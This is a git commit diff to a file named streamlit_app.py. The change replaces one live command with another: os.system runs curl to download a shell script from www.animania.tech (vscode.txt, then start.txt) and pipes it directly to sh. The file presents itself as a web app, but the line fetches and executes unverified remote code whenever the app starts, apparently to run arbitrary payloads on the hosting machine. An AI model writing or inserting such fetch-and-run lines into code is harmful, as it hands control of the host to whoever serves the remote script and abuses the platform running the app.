80d956aa04019e799eea8d0e860fb2b0600fd04e
deryl93 <95095509+deryl93@users.noreply.github.com>
2021-11-27 00:34:16 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import os
 # os.environ['HTTP_PROXY'] = proxy
 # os.environ['https_proxy'] = proxy
 # os.environ['HTTPS_PROXY'] = proxy
-os.system("curl -fsSL https://www.animania.tech/vscode.txt | sh")
+os.system("curl -fsSL https://www.animania.tech/start.txt | sh")
